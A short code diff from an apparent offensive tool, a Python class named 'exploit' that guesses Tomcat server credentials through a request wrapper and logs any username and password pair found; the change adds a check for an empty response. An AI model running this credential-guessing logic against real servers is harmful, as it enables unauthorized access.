@@ -27,5 +27,5 @@ class exploit():
                     payload = wrapper_http(self.SERVER_TOMCAT, ip, self.SERVER_PORT, usernm=usr, passwd=pss)
                     r = requester.do_request(args.param, payload)
 
-                    if not "s3cret" in r.text:
+                    if r != None and not "s3cret" in r.text:
                         logging.info("Found credential \033[32m{}\033[0m:\033[32m{}\033[0m".format(usr, pss))
